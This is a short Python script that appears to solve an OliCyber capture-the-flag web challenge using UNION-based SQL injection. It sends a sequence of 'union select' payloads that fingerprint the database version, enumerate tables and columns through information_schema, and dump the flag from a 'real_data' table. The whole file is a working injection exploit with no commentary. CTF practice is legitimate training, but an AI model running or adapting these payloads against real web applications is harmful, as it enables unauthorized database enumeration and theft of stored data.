#!/usr/bin/env python3

from Inj import Inj

inj = Inj('http://web-17.challs.olicyber.it')

def sqli(sql):
    ret = "1' union select {} 1='1".format(sql)
    return ret

response, error = inj.union('1')
print(response)

response, error = inj.union(sqli('1,2,3,4,5,version() where'))
print(response)

response, error = inj.union(sqli('1,2,3,4,5,table_name from information_schema.tables where table_schema=database() and'))
print(response)

response, error = inj.union(sqli('1,2,3,4,5,column_name from information_schema.columns where table_name=\'real_data\' and'))
print(response)

response, error = inj.union(sqli('1,2,3,4,id,flag from real_data where'))
print(response)